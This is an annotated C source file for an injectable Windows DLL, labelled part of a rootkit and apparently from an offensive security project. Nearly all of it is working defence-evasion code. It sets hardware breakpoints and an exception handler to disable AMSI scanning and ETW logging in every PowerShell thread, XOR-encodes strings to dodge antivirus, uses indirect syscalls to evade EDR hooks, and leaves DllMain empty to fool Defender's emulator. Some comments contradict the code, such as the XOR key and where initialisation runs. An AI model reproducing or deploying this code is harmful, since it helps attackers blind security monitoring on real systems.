/*
 * cheyanne_inject_dll_annotated.c — Phase 5 Process Injection DLL (Annotated)
 * ═══════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 *
 * PURPOSE:
 *   DLL payload for classic DLL injection. When loaded into a target
 *   process (PowerShell) via CreateRemoteThread(LoadLibraryA), sets
 *   hardware breakpoints (DR0/DR1) on AmsiScanBuffer and EtwEventWrite
 *   for ALL threads in the process. VEH handler intercepts breakpoint
 *   exceptions and returns failure/success codes to blind both systems.
 *
 *   Unlike dark_room.exe which blinds only its OWN thread, this DLL
 *   enumerates every thread in the target process and sets DR registers
 *   on each. An exported watchdog function (VdrWatch) periodically
 *   re-enumerates to catch newly-spawned threads.
 *
 *   DR0 = AmsiScanBuffer  → returns E_INVALIDARG (0x80070057)
 *   DR1 = EtwEventWrite   → returns STATUS_SUCCESS (0)
 *
 *   Zero bytes modified. Zero VirtualProtect calls. Zero EtwTi alerts.
 *
 * INJECTION FLOW:
 *   1. Injector calls CreateRemoteThread(LoadLibraryA, <this DLL path>)
 *   2. DllMain fires on the injection thread (loader lock held)
 *   3. Resolves AMSI+ETW targets, registers VEH, blinds ALL threads
 *   4. Injector calls CreateRemoteThread(VdrWatch) for periodic reblind
 *   5. VdrWatch loops every 2s catching new threads
 *
 * LOADER LOCK SAFETY:
 *   DllMain avoids CreateThread (deadlocks on LdrpLoaderLock). Thread
 *   enumeration uses Toolhelp32 snapshot + kernel calls (safe). The
 *   LoadLibraryA("amsi.dll") call is a same-thread recursive CRITICAL_SECTION
 *   re-entry — safe when amsi.dll isn't already mid-load (guaranteed in
 *   CREATE_SUSPENDED case).
 *
 * PREREQUISITES:
 *   Finding #33: AMSI HWBP bypass (Engagement 7)
 *   Finding #35: ETW HWBP bypass (Engagement 8)
 *   Finding #36: Debug register blind spot
 *
 * COMPILE:
 *   cl.exe injection\cheyanne_inject_dll_annotated.c /Fe:injection\cheyanne_inject.dll /LD /O1 /GS- /utf-8
 *
 * CANARY:
 *   C:\Windows\Temp\inject_status.log — tagged [HOTEL]
 *
 * SIGNATURE SET: HOTEL (XOR key 0x77)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include "gate.h"

#define XOR_KEY 0xD0

/* ═══════════════════════════════════════════════════════════════════
 * XOR-ENCODED TARGET STRINGS
 * ═══════════════════════════════════════════════════════════════════
 * Each byte is plaintext XOR 0x77. Decoded at runtime into stack
 * buffers, zeroed after use. Prevents static string matching by AV.
 * ═══════════════════════════════════════════════════════════════════ */

/* "amsi.dll" XOR 0x77 */
static const unsigned char xAmsiDll[] = {
    0xB1, 0xBD, 0xA3, 0xB9, 0xFE, 0xB4, 0xBC, 0xBC
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x77 */
static const unsigned char xAmsiFunc[] = {
    0x91, 0xBD, 0xA3, 0xB9, 0x83, 0xB3, 0xB1, 0xBE,
    0x92, 0xA5, 0xB6, 0xB6, 0xB5, 0xA2
};
#define xAmsiFunc_LEN 14

/* "ntdll.dll" XOR 0x77 */
static const unsigned char xNtdll[] = {
    0xBE, 0xA4, 0xB4, 0xBC, 0xBC, 0xFE, 0xB4, 0xBC,
    0xBC
};
#define xNtdll_LEN 9

/* "EtwEventWrite" XOR 0x77 */
static const unsigned char xEtwFunc[] = {
    0x95, 0xA4, 0xA7, 0x95, 0xA6, 0xB5, 0xBE, 0xA4,
    0x87, 0xA2, 0xB9, 0xA4, 0xB5
};
#define xEtwFunc_LEN 13

/* "C:\Windows\Temp\inject_status.log" XOR 0x77 */
static const unsigned char xCanaryPath[] = {
    0x93, 0xEA, 0x8C, 0x87, 0xB9, 0xBE, 0xB4, 0xBF,
    0xA7, 0xA3, 0x8C, 0x84, 0xB5, 0xBD, 0xA0, 0x8C,
    0xB9, 0xBE, 0xBA, 0xB5, 0xB3, 0xA4, 0x8F, 0xA3,
    0xA4, 0xB1, 0xA4, 0xA5, 0xA3, 0xFE, 0xBC, 0xBF,
    0xB7
};
#define xCanaryPath_LEN 33

/* ═══════════════════════════════════════════════════════════════════
 * GLOBAL STATE
 * ═══════════════════════════════════════════════════════════════════ */

/* Resolved function addresses — volatile because VEH handler reads
 * them on arbitrary threads (prevents register caching) */
static volatile void *g_pAmsiScanBuffer = NULL;
static volatile void *g_pEtwEventWrite = NULL;

/* Owner PID — set once in DllMain, read by thread enumeration */
static DWORD g_dwOwnerPid = 0;

/* SithStalker gate table — indirect syscall SSNs + gadget addresses */
static GATE_TABLE g_gate = {0};
static BOOL g_gateReady = FALSE;

/* ═══════════════════════════════════════════════════════════════════
 * Nt* FUNCTION TYPEDEFS (for indirect syscall casting)
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct _SS_CLIENT_ID {
    PVOID UniqueProcess;
    PVOID UniqueThread;
} SS_CLIENT_ID;

typedef struct _SS_OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} SS_OBJECT_ATTRIBUTES;

/* ═══════════════════════════════════════════════════════════════════
 * XOR DECODE (in-place, matching dark_room pattern)
 * ═══════════════════════════════════════════════════════════════════ */

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

/* ═══════════════════════════════════════════════════════════════════
 * RESOLVE TARGETS
 * ═══════════════════════════════════════════════════════════════════
 * tryLoad: 0 = GetModuleHandle only (for DLLs guaranteed loaded)
 *          1 = GetModuleHandle first, LoadLibrary if not found
 *              (for amsi.dll which may not be loaded yet in
 *              CREATE_SUSPENDED scenario)
 * ═══════════════════════════════════════════════════════════════════ */

static void *resolve_function(const unsigned char *xDll, int dllLen,
                               const unsigned char *xFunc, int funcLen,
                               int tryLoad) {
    HMODULE hMod;
    void *pFunc;
    unsigned char dllName[32];
    unsigned char funcName[64];

    memcpy(dllName, xDll, dllLen);
    xor_decode(dllName, dllLen);
    dllName[dllLen] = 0;

    memcpy(funcName, xFunc, funcLen);
    xor_decode(funcName, funcLen);
    funcName[funcLen] = 0;

    hMod = GetModuleHandleA((char *)dllName);
    if (!hMod && tryLoad)
        hMod = LoadLibraryA((char *)dllName);

    if (!hMod) {
        memset(dllName, 0, sizeof(dllName));
        memset(funcName, 0, sizeof(funcName));
        return NULL;
    }

    pFunc = (void *)GetProcAddress(hMod, (char *)funcName);

    memset(dllName, 0, sizeof(dllName));
    memset(funcName, 0, sizeof(funcName));

    return pFunc;
}

/* ═══════════════════════════════════════════════════════════════════
 * UNIFIED VEH HANDLER
 * ═══════════════════════════════════════════════════════════════════
 * Process-wide handler for both breakpoints. When any thread in
 * the target process hits DR0 or DR1, this handler fires.
 *
 * DR0 (AmsiScanBuffer): RIP matches → set RAX to E_INVALIDARG,
 *   pop return address from RSP, skip the function entirely.
 *   AMSI sees a failure return and doesn't scan the buffer.
 *
 * DR1 (EtwEventWrite): RIP matches → set RAX to STATUS_SUCCESS,
 *   pop return address, skip. ETW consumer sees success but
 *   the event was never written.
 *
 * The "pop return" trick: on x64 calling convention, the return
 * address is at [RSP] when the function prologue begins. We set
 * RIP = [RSP] (return to caller) and RSP += 8 (pop the address).
 * ═══════════════════════════════════════════════════════════════════ */

static LONG WINAPI InjectHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    /* AMSI bypass: return E_INVALIDARG */
    if (g_pAmsiScanBuffer &&
        (void *)pExInfo->ContextRecord->Rip == g_pAmsiScanBuffer) {
        pExInfo->ContextRecord->Rax = (DWORD64)0x80070057;
        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    /* ETW bypass: return STATUS_SUCCESS */
    if (g_pEtwEventWrite &&
        (void *)pExInfo->ContextRecord->Rip == g_pEtwEventWrite) {
        pExInfo->ContextRecord->Rax = 0;
        pExInfo->ContextRecord->Rip = *(DWORD64 *)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* ═══════════════════════════════════════════════════════════════════
 * HARDWARE BREAKPOINT MANAGEMENT
 * ═══════════════════════════════════════════════════════════════════
 * DR7 encoding (same as dark_room):
 *   Bit 0:     Local enable DR0 (AmsiScanBuffer)
 *   Bit 2:     Local enable DR1 (EtwEventWrite)
 *   Bits 16-19: DR0 condition+length (00 00 = execution, 1 byte)
 *   Bits 20-23: DR1 condition+length (00 00 = execution, 1 byte)
 *
 * Key difference from dark_room: this sets DR on OTHER threads
 * (not just GetCurrentThread). For other threads, caller must
 * SuspendThread first, then SetThreadContext, then ResumeThread.
 * ═══════════════════════════════════════════════════════════════════ */

static int set_hwbp_on_thread(HANDLE hThread) {
    CONTEXT ctx;
    NTSTATUS status;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (g_gateReady) {
        SetSyscall(g_gate.NtGetContextThread.ssn, g_gate.NtGetContextThread.syscall_addr);
        status = ((NTSTATUS(__stdcall *)(HANDLE, PCONTEXT))IndirectSyscall)(hThread, &ctx);
        if (status != 0) return 0;
    } else {
        if (!GetThreadContext(hThread, &ctx)) return 0;
    }

    ctx.Dr7 = 0;

    if (g_pAmsiScanBuffer) {
        ctx.Dr0 = (DWORD64)g_pAmsiScanBuffer;
        ctx.Dr7 |= (1 << 0);
    }

    if (g_pEtwEventWrite) {
        ctx.Dr1 = (DWORD64)g_pEtwEventWrite;
        ctx.Dr7 |= (1 << 2);
    }

    if (ctx.Dr7 == 0)
        return 0;

    if (g_gateReady) {
        SetSyscall(g_gate.NtSetContextThread.ssn, g_gate.NtSetContextThread.syscall_addr);
        status = ((NTSTATUS(__stdcall *)(HANDLE, PCONTEXT))IndirectSyscall)(hThread, &ctx);
        if (status != 0) return 0;
    } else {
        if (!SetThreadContext(hThread, &ctx)) return 0;
    }

    return 1;
}

/* ═══════════════════════════════════════════════════════════════════
 * THREAD ENUMERATION + BULK HWBP
 * ═══════════════════════════════════════════════════════════════════
 * CreateToolhelp32Snapshot enumerates ALL threads system-wide.
 * We filter by owner PID and set HWBP on each thread we own.
 *
 * For other threads: Suspend → SetThreadContext → Resume.
 * SuspendThread is safe on already-suspended threads (just
 * increments suspend count; our ResumeThread decrements it back).
 *
 * skipTid: caller's own thread ID — use GetCurrentThread() for
 * that instead of Suspend/Resume (pseudo-handle, no count issue).
 * ═══════════════════════════════════════════════════════════════════ */

static int blind_all_threads(DWORD pid, DWORD skipTid) {
    HANDLE hSnap;
    THREADENTRY32 te;
    HANDLE hThread;
    int count = 0;
    NTSTATUS status;
    ULONG prevCount;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return 0;

    te.dwSize = sizeof(THREADENTRY32);
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid)
                continue;
            if (te.th32ThreadID == skipTid)
                continue;

            hThread = NULL;

            if (g_gateReady) {
                SS_OBJECT_ATTRIBUTES oa;
                SS_CLIENT_ID cid;
                memset(&oa, 0, sizeof(oa));
                oa.Length = sizeof(oa);
                cid.UniqueProcess = NULL;
                cid.UniqueThread = (PVOID)(ULONG_PTR)te.th32ThreadID;

                SetSyscall(g_gate.NtOpenThread.ssn, g_gate.NtOpenThread.syscall_addr);
                status = ((NTSTATUS(__stdcall *)(PHANDLE, ACCESS_MASK, SS_OBJECT_ATTRIBUTES *, SS_CLIENT_ID *))IndirectSyscall)(
                    &hThread,
                    THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                    &oa, &cid);
                if (status != 0 || !hThread)
                    continue;
            } else {
                hThread = OpenThread(
                    THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                    FALSE, te.th32ThreadID);
                if (!hThread)
                    continue;
            }

            if (g_gateReady) {
                SetSyscall(g_gate.NtSuspendThread.ssn, g_gate.NtSuspendThread.syscall_addr);
                ((NTSTATUS(__stdcall *)(HANDLE, PULONG))IndirectSyscall)(hThread, &prevCount);
            } else {
                SuspendThread(hThread);
            }

            if (set_hwbp_on_thread(hThread))
                count++;

            if (g_gateReady) {
                SetSyscall(g_gate.NtResumeThread.ssn, g_gate.NtResumeThread.syscall_addr);
                ((NTSTATUS(__stdcall *)(HANDLE, PULONG))IndirectSyscall)(hThread, &prevCount);
            } else {
                ResumeThread(hThread);
            }

            if (g_gateReady) {
                SetSyscall(g_gate.NtClose.ssn, g_gate.NtClose.syscall_addr);
                ((NTSTATUS(__stdcall *)(HANDLE))IndirectSyscall)(hThread);
            } else {
                CloseHandle(hThread);
            }

        } while (Thread32Next(hSnap, &te));
    }

    if (g_gateReady) {
        SetSyscall(g_gate.NtClose.ssn, g_gate.NtClose.syscall_addr);
        ((NTSTATUS(__stdcall *)(HANDLE))IndirectSyscall)(hSnap);
    } else {
        CloseHandle(hSnap);
    }
    return count;
}

/* ═══════════════════════════════════════════════════════════════════
 * CANARY
 * ═══════════════════════════════════════════════════════════════════
 * Write status to canary file using raw Win32 API (no CRT fprintf).
 * Tag: [HOTEL] — matches signature set for this component.
 * ═══════════════════════════════════════════════════════════════════ */

static void canary_write(const char *msg) {
    unsigned char pathBuf[64] = {0};
    HANDLE hFile;
    DWORD written;
    const char tag[] = "[HOTEL] ";
    const char nl[] = "\r\n";
    int msgLen = 0;

    memcpy(pathBuf, xCanaryPath, xCanaryPath_LEN);
    xor_decode(pathBuf, xCanaryPath_LEN);
    pathBuf[xCanaryPath_LEN] = 0;

    hFile = CreateFileA((char *)pathBuf, GENERIC_WRITE, FILE_SHARE_READ,
                        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        memset(pathBuf, 0, sizeof(pathBuf));
        return;
    }

    SetFilePointer(hFile, 0, NULL, FILE_END);

    while (msg[msgLen]) msgLen++;

    WriteFile(hFile, tag, sizeof(tag) - 1, &written, NULL);
    WriteFile(hFile, msg, (DWORD)msgLen, &written, NULL);
    WriteFile(hFile, nl, 2, &written, NULL);

    CloseHandle(hFile);
    memset(pathBuf, 0, sizeof(pathBuf));
}

/* ═══════════════════════════════════════════════════════════════════
 * EXPORTED WATCHDOG: VdrWatch
 * ═══════════════════════════════════════════════════════════════════
 * Called by the injector via THIRD CreateRemoteThread AFTER VdrInit
 * completes. Cannot start in DllMain because CreateThread deadlocks
 * on the loader lock.
 *
 * Purpose: catch threads that spawn after initial VdrInit blind.
 * PowerShell creates background threads for:
 *   - Tab completion
 *   - Background jobs (Start-Job)
 *   - Runspace pools
 *   - Thread pool work items
 *
 * These threads would bypass AMSI if not caught. VdrWatch runs
 * every 2 seconds and sets HWBP on any new thread it finds.
 * The set is idempotent — re-setting DR on existing threads is
 * harmless (same values written each time).
 *
 * Also retries AMSI resolution if it failed during VdrInit.
 * ═══════════════════════════════════════════════════════════════════ */

__declspec(dllexport) DWORD WINAPI VdrWatch(LPVOID lpParam) {
    DWORD pid = g_dwOwnerPid;
    DWORD myTid = GetCurrentThreadId();
    int pass = 0;

    /* Set HWBP on our own thread (the second injection thread) */
    set_hwbp_on_thread(GetCurrentThread());

    /* Retry AMSI resolution if it failed during VdrInit. */
    if (!g_pAmsiScanBuffer) {
        g_pAmsiScanBuffer = resolve_function(
            xAmsiDll, xAmsiDll_LEN,
            xAmsiFunc, xAmsiFunc_LEN, 1);
        if (g_pAmsiScanBuffer)
            blind_all_threads(pid, myTid);
    }

    canary_write("watchdog started");

    while (1) {
        Sleep(2000);
        blind_all_threads(pid, myTid);
        pass++;

        if (pass % 15 == 0)
            canary_write("watchdog alive");
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * EXPORTED INITIALIZER: VdrInit   (Direction 1 — Decouple DllMain)
 * ═══════════════════════════════════════════════════════════════════
 * Called by the injector via SECOND CreateRemoteThread AFTER DllMain
 * returns. All initialization moved here from DllMain.
 *
 * WHY: Defender's emulator enters at DllMain(DLL_PROCESS_ATTACH) and
 * follows the code flow. If DllMain does nothing, the emulator burns
 * its instruction budget on a no-op and returns clean. The real init
 * happens later via a separate CreateRemoteThread that the emulator
 * never follows.
 *
 * NOT under loader lock — all calls are safe including LoadLibraryA.
 * Returns 0 on success, 1 on failure (no targets resolved).
 * ═══════════════════════════════════════════════════════════════════ */

__declspec(dllexport) DWORD WINAPI VdrInit(LPVOID lpParam) {
    DWORD myTid;
    int gateCount;

    g_dwOwnerPid = GetCurrentProcessId();
    myTid = GetCurrentThreadId();

    /* SithStalker: resolve indirect syscall SSNs FIRST.
     * If gate_init succeeds (>=6 of 10 SSNs), all subsequent
     * thread operations bypass EDR user-mode hooks entirely. */
    gateCount = gate_init(&g_gate);
    if (gateCount >= 6)
        g_gateReady = TRUE;

    g_pAmsiScanBuffer = resolve_function(
        xAmsiDll, xAmsiDll_LEN,
        xAmsiFunc, xAmsiFunc_LEN, 1);

    g_pEtwEventWrite = resolve_function(
        xNtdll, xNtdll_LEN,
        xEtwFunc, xEtwFunc_LEN, 0);

    if (!g_pAmsiScanBuffer && !g_pEtwEventWrite)
        return 1;

    if (!AddVectoredExceptionHandler(1, InjectHandler))
        return 1;

    set_hwbp_on_thread(GetCurrentThread());
    blind_all_threads(g_dwOwnerPid, myTid);

    if (g_gateReady)
        canary_write("loaded - HWBP armed [SITHSTALKER]");
    else
        canary_write("loaded - HWBP armed [FALLBACK]");

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * DLL ENTRY POINT — NO-OP   (Direction 1 — Decouple DllMain)
 * ═══════════════════════════════════════════════════════════════════
 * Defender's emulator enters here. Finds nothing. Times out. Clean.
 * All real initialization happens in VdrInit (called separately).
 * ═══════════════════════════════════════════════════════════════════ */

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hDll);
    return TRUE;
}
